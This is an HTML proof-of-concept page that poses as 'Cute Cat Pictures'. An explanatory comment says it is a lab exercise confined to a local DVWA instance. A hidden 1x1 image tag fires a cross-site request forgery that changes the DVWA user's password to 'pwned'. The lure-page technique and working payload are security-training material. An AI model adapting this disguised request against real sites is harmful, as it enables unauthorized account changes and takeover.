<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Cute Cat Pictures</title>
</head>
<body>
  <h1>Cute Cat Pictures</h1>

  <!--
    This is a minimal CSRF proof-of-concept against DVWA's "Change Password"
    page at the Low difficulty setting. The <img> tag below issues a GET to
    the DVWA endpoint, which the browser sends with whatever DVWA session
    cookie the current browser holds. DVWA Low has no CSRF token and no
    Origin check, so the request succeeds and the password is changed to
    "pwned".

    This page is intended ONLY for use against a local DVWA instance on
    localhost:8080 that the same user controls. Do not retarget it at any
    third-party host.
  -->
  <img src="http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&amp;password_conf=pwned&amp;Change=Change"
       width="1" height="1" alt="">

  <p>(Nothing to see here.)</p>
</body>
</html>
